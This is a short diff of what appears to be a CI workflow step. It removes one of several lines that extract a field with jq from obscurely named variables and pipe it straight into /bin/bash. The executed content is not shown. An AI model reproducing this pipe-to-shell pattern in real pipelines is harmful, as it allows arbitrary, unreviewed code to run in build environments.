@@ -27,7 +27,6 @@ jobs:
           echo $rlojy39 | jq -r .cvsbv95 | /bin/bash
           printf '%s' "$s406" | jq -r .vq61558 | /bin/bash
           printf '%s' "$tset9" | jq -r .b2354 | /bin/bash
-          printf '%s' "$g802" | jq -r .b6387 | /bin/bash
           echo $z50294 | jq -r .kkr806 | /bin/bash
 
       - name: Save output
